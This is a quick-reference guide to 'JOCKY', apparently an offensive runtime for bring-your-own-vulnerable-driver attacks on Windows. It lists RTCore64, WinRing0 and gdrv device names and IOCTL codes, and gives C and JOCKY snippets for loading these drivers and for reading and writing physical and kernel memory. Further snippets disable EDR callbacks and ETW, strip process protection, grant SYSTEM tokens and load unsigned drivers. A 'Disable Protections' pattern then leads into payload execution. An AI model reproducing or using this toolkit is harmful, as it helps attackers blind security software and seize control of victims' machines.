# JOCKY Driver Configuration – Quick Reference

## TL;DR

**Two ways to use drivers:**

1. **Static profiles** (built-in) – RTCore64, WinRing0, gdrv
2. **Dynamic manifests** (custom) – any driver with unknown IOCTLs

---

## Load a Driver (JOCKY)

```jocky
ffi jocky_byovd_new() -> i64;
ffi jocky_byovd_load(service_name: i64, device_name: i64, ctx: i64) -> bool;
ffi jocky_byovd_unload(ctx: i64) -> void;

fn main() -> i32 {
    let ctx: i64 = jocky_byovd_new();
    if jocky_byovd_load(0, 0, ctx) {  // NULL service/device = auto-generated
        printf("Loaded\n");
    }
    jocky_byovd_unload(ctx);
    return 0;
}
```

## Load a Driver (C)

```c
#include <jocky_rt.h>

int main() {
    jocky_byovd_t ctx = {0};
    
    // Extract .jdrv → drop to %TEMP% → register SCM service → start
    if (!jocky_byovd_load(NULL, NULL, &ctx)) {
        return 1;  // Failed
    }
    
    printf("Driver: %s at %s\n", ctx.service_name, ctx.driver_path);
    
    // Use driver here...
    
    jocky_byovd_unload(&ctx);  // Stop service, delete .sys
    return 0;
}
```

---

## Read Physical Memory

**Auto-detect driver (RTCore64/WinRing0/gdrv):**

```c
uint8_t buf[256];
jocky_driver_read_phys(&ctx, 0x1000, buf, 256);
```

---

## Write Physical Memory

```c
uint8_t data[16] = {0x01, 0x02, ...};
jocky_driver_write_phys(&ctx, 0x1000, data, 16);
```

---

## Read MSR (WinRing0 only)

```c
uint64_t value;
jocky_driver_read_msr(&ctx, 0xC0000080, &value);  // IA32_EFER
printf("MSR = 0x%llx\n", value);
```

---

## Map Physical Address (gdrv only)

```c
uintptr_t kernel_va;
jocky_driver_map_phys(&ctx, 0x1000, 4096, &kernel_va);
// Now access phys 0x1000 via kernel_va
```

---

## Custom Driver (Manifest)

### 1. Create manifest (`manifest.yaml`)

```yaml
primitives:
  read_mem:
    ioctl: 0x12345678
    in_size: 16
    out_size: 1024
```

### 2. Build with manifest

```bash
jockyc code.c --manifest manifest.yaml -o app.exe
```

### 3. Use at runtime

```c
uint8_t in[16] = {0};
uint8_t out[1024] = {0};
jocky_driver_invoke(&ctx, "read_mem", in, 16, out, 1024);
```

---

## Disable EDR/ETW

```c
jocky_disable_edr_callbacks(&ctx);    // Remove kernel callback hooks
jocky_disable_etw(&ctx);              // Disable ETW logging
jocky_disable_etw_ti(&ctx);           // Disable TI provider
jocky_disable_ob_callbacks(&ctx);     // Remove object manager hooks
```

---

## Strip PPL / Elevate Token

```c
jocky_strip_ppl(&ctx, target_pid);           // Remove Process Protection
jocky_elevate_token(&ctx, target_pid);       // Grant SYSTEM token
jocky_downgrade_token(&ctx, target_pid);     // Remove privileges
```

---

## Load Unsigned Driver (DSE Bypass)

```c
// Atomically disable DSE → load driver → restore DSE (PatchGuard-safe)
jocky_dse_load_driver(&ctx, L"C:\\path\\to\\driver.sys", "my_service");
```

---

## Kernel Virtual Memory Access

```c
jocky_kread(&ctx, kernel_virtual_addr, buf, size);
jocky_kwrite(&ctx, kernel_virtual_addr, data, size);
```

---

## Memory Allocation

```c
void* buf = jocky_alloc(4096);      // Allocate
jocky_free(buf);                     // Free

void* ctx = jocky_byovd_new();       // Allocate context
jocky_byovd_destroy(ctx);            // Free context
```

---

## Static Profiles Reference

| Driver | Device | IOCTLs |
|---|---|---|
| **RTCore64** | `\\.\RTCore64` | 0x80002048 (R), 0x8000204C (W) |
| **WinRing0** | `\\.\WinRing0_1_2_0` | 0x9C402584 (R), 0x9C402588 (W), 0x9C40258C (MSR-R), 0x9C402590 (MSR-W) |
| **WinRing0x64** | `\\.\WinRing0x64_1_2_0` | Same as WinRing0 |
| **gdrv** | `\\.\GIO` | 0xC3502808 (Map) |

---

## Fallback Chain

When you call `jocky_driver_read_phys(&ctx, ...)`:

1. Auto-detect from `ctx->service_name`
2. If static profile exists → use it
3. Else → try manifest primitive "read_phys"
4. Else → fail

---

## Error Handling

```c
if (!jocky_byovd_load(NULL, NULL, &ctx)) {
    // Failed: no .jdrv section, no admin, or other error
    return false;
}

if (!jocky_driver_read_phys(&ctx, addr, buf, size)) {
    // Failed: driver doesn't support read_phys, or I/O error
    return false;
}

if (!jocky_disable_edr_callbacks(&ctx)) {
    // Failed: couldn't find kernel callbacks, or struct mismatch
    return false;
}
```

---

## Context Structure

```c
typedef struct {
    HANDLE device;               // Handle to \\.\DeviceName
    char   driver_path[MAX_PATH];// C:\Users\...\Temp\xxx.sys
    char   service_name[64];     // SCM service name (e.g., "jky_a1b2c3d4")
} jocky_byovd_t;
```

---

## Compile & Run

```bash
# Build with C++ compiler
./compiler/build/jockyc code.jky -o app.exe -p standard

# Build with Python frontend
./jocky build code.jky --profile standard -o app.exe

# Run (requires admin on Windows)
app.exe
```

---

## Common Patterns

### Pattern 1: Disable Protections

```c
jocky_byovd_t ctx = {0};
jocky_byovd_load(NULL, NULL, &ctx);

// Strip defenses
jocky_disable_edr_callbacks(&ctx);
jocky_disable_etw(&ctx);
jocky_disable_etw_ti(&ctx);
jocky_strip_ppl(&ctx, target_pid);

// Now inject/execute payload...

jocky_byovd_unload(&ctx);
```

### Pattern 2: Read Kernel Memory

```c
jocky_byovd_t ctx = {0};
jocky_byovd_load(NULL, NULL, &ctx);

uint8_t buf[256];
if (jocky_kread(&ctx, kernel_va, buf, 256)) {
    printf("Read kernel memory: %02x %02x...\n", buf[0], buf[1]);
}

jocky_byovd_unload(&ctx);
```

### Pattern 3: Custom Driver IOCTL

```c
// manifest.yaml defines "my_ioctl"
jocky_byovd_t ctx = {0};
jocky_byovd_load(NULL, NULL, &ctx);

uint8_t in[32] = {/* data */};
uint8_t out[256] = {0};

jocky_driver_invoke(&ctx, "my_ioctl", in, 32, out, 256);

jocky_byovd_unload(&ctx);
```

---

## See Also

- Full docs: `docs/driver-configuration.md`
- Demo code: `examples/driver_config_demo.jky`
- Runtime API: `src/runtime/include/jocky_rt.h`
